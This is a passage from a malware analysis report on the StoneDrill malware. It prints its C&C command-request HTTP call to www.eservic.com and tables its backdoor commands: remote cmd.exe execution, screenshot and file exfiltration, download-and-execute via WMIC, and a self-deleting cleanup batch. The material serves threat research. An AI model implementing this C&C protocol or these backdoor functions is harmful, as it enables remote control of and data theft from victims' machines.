2.7.4. Fourth step: Get commands list
During the fourth step, the malware requests available commands from the C&C:
GET
/insert/index?id= %cid_from_config%%random_part_of_client_id% &hst= %base64encoded_computer_and_user_
name_cpuid0_checksum% &ttype=102&sta
te=201 HTTP/1.1
Host: www.eservic.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: %string_received_in_login_step%
Connection: close
Here is a list of the StoneDrill commands available:
|Command|Internal Help Strings|Command Description|
|---|---|---|
|os|1. OS (The is Response the OperatingSystem of the Client Machine)|Return details about Windows version, edition,architecture and environment|
|version|2. Version (The Response is Version ofRunning Product on the Client Machine)|“2.0.1610.76” string returned|
|time|3. Time (The Response is Current Time ofthe Client Machine)|Current system and local time are returned|
|shell|4. Shell Value (Give You Access the CMDConsole in the Client Machine; Value isAnything that You Want to Writing in theCMD Console of the Client Machine andExecute it)|Stdout/stderr streams of executed “cmd.exe /C%value%” command are captured and send backto CC|
|screenshot|5. Screenshot (The Response is a JPEG Fileof the Screenshot of the Client MachineDesktop)|1-At first the malware takes screenshot intorandomly named.bmpfile in %TEMP% folder. 2-Then takes second screenshot, now with jpegcompression and store it as.jpg file with randomname. In case of successjpgcreationbmp file isdeleted. 3-Send screenshot file to C&C and delete temporaryfiles.|
|delay|6. Delay Value (Adjust the Time-Interval forthe Server and Client Communication; Valuecan be Between 1000-100000; 1000 is High-End Speed)||
|download|7. Download "From" "To" (Download a FileFrom "a URL" To "a Directory on the ClientMachine")|Downloaded file initially stored as“%TEMP%*Test.tmp”, then deXORed with 0xCCand copied to specified location with VBS script “C-Dled-C-Cpy-T.vbs” as previously described, file isthen executed with command: "cmd /c WMIC Process CallCreate*|
|Col1|Col2|C:\Windows\System32\Wscript.exe //NOLOGO|
|---|---|---|
|upload|8. Upload "From" (Upload a File From "aDirectory on the Client Machine")||
|update|9. Update "From" (Download the NewVersion of the Product From "a URL" andExecute it on the Client Machine)|Downloaded file initially stored with random nameinside %TEMP% folder, then renamed by usingC-Uptd-C-Cpy-T.vbsand C-Up-C-Dt-T.batsimilar toprevious steps|
|uninstall|10. Uninstall (Uninstall The Running Productfrom the Client Machine and Delete All Side-Effects)|Unregister autorun with  command: cmd /c REG DELETEHKCU\SOFTWARE\Microsoft**Windows\CurrentVersion\Run/v Stp /f Then drop and runC-Un-C-Instl-T.bat with body:|
|uninstall|10. Uninstall (Uninstall The Running Productfrom the Client Machine and Delete All Side-Effects)|ping 1.1.1.1 -n 5 -w 2000 > nul RMDIR /S /Q "C:\ProgramData\Chrome\" RMDIR /S /Q "C:\ProgramData\InternetExplorer\"Del "%TEMP%\C-Un-C-Instl-T.bat" |
|uninstall|10. Uninstall (Uninstall The Running Productfrom the Client Machine and Delete All Side-Effects)|Then terminates itself.|
|antivirus|11. Antivirus (The Response is InstalledAntivirus on the Client Machine)|Queries Windows Management Instrumentation(WMI) database for installed AntiVirusProduct details. Runs additional registrylookups for details of:Avast, McAfee, Avg, BitDefender products.|
|help|12. Help (Response is the List of SupportedCommands in the Current Version of Productthat Running on the Client Machine)|List title is"-Command List of the CurrentVesrion are:"**|
